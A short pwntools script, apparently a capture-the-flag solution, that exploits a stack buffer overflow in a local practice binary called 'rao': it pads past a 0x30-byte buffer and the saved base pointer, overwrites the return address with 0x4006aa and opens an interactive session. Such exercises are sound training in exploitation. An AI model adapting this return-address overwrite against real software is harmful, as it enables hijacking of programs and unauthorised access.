from pwn import *

# buf = [rbp - 0x30], 

p = process('./rao')

payload = b'A' * 0x30
payload += b'B' * 0x8
payload += p64(0x4006aa)

p.sendlineafter(b'Input: ', payload)

p.interactive()